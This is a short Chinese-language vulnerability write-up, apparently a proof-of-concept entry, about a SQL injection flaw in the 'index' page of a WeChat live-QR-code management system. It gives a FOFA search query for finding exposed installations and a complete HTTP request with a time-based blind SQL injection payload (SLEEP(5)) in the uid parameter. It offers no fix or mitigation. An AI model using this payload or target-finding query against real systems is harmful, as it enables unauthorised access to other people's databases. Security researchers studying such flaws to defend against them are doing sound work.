# 微信活码系统index存在SQL注入漏洞

# 一、漏洞简介
微信活码系统是基于微信平台的 二维码只管理系统，旨在帮助企业和个人实现更高效的社群运营和流量管理。可以将多个二维码合并成一个二维码的工具，用户扫描该固定二维码后，可以看到一个微信二维码(可以是群二维码，也可以是个人名片二维码)，而这些二维码可以在后台随时进行更换。通过这种方式，微信活码系统有效避免了因频繁更换二维码导致的流量丢失，提高了社群运营的效率。微信活码系统index存在SQL注入漏洞

# 二、影响版本
+ 微信活码系统

# 三、资产测绘
+ fofa `body=".qn-user-login"`
+ 特征

![1732275497192-0cf606aa-431c-438b-b554-a0b15c384708.png](./img/wJghLzqoOCcyak_L/1732275497192-0cf606aa-431c-438b-b554-a0b15c384708-812866.png)

# 四、漏洞复现
```java
GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(5)))RkHL)%20AND%20(1015=1015 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```

![1732275546711-b42add2f-5705-45a8-9128-49d5d4bdc35e.png](./img/wJghLzqoOCcyak_L/1732275546711-b42add2f-5705-45a8-9128-49d5d4bdc35e-612056.png)



> 更新: 2024-11-27 10:00:05  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gn9zt676czv8oypd>